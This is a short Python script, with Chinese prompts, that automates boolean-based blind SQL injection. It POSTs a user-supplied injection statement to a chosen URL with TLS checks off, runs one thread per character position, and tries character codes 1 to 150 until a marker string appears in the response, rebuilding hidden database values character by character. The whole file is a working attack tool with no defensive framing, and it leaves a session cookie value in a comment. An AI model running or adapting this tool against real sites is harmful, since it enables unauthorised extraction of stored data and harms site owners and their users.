import requests
import threading
import warnings
warnings.filterwarnings("ignore")
result=int(input("输入查找长度"))
list=[0]*result
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
url = input("输入url")
# cookie={"PHPSESSID":"a8vgr70gfctbap6sue4q9pntin"}
if not any(k in url for k in ["http://","https://"]):
    url = "http://" + url
data=input("输入注入语句")
find=input("需要查找的字符串")
def fun(url,result,result2):
    # try:
        for i in range(result2):
            # reponse=requests.get(url+data.format(result,i),verify=False,headers=headers)
            reponse=requests.post(url=url,data=data.format(result,i+1),verify=False,headers=headers)
            # print(reponse.text)
            if find in reponse.text:
            # print(reponse.text)
            # if reponse.status_code==302:#匹配请求头返回代码
                with lock:
                    list[result-1]=chr(i+1)
                    print(str(list)+"\n")
                    print(f"第{result}是："+chr(i+1)+"\n")
                    break
        return
    # except:
    #     pass
lock=threading.Lock()
for  i in range(result):
    t=threading.Thread(target=fun,args=(url,i+1,150))
    t.start()